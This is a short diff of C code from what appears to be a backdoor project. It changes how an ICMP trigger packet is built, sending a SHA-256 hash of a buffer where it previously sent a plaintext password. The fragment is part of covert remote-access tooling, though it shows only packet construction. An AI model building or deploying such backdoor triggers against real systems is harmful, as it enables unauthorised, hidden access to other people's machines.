@@ -32,7 +32,8 @@ int socket_creation(t_backdoor *backdoor)
 
 void    icmp_creation(t_backdoor *backdoor)
 {
-    int payload_len;
+    int             payload_len;
+    unsigned char   hash_payload[32];
 
     memset(backdoor->packet, 0, PACKET_SIZE);
 
@@ -44,8 +45,11 @@ void    icmp_creation(t_backdoor *backdoor)
     backdoor->icmp_hdr->checksum = 0;
 
     backdoor->payload = backdoor->packet + sizeof(struct icmphdr);
-    strcpy(backdoor->payload, PASSWORD);
-    payload_len = strlen(PASSWORD);
+
+    ft_sha256(backdoor->buffer, strlen(backdoor->buffer), hash_payload);
+
+    memcpy(backdoor->payload, hash_payload, 32);
+    payload_len = 32;
 
     backdoor->icmp_hdr->checksum = calculate_checksum(backdoor->packet, sizeof(struct icmphdr) + payload_len);
 
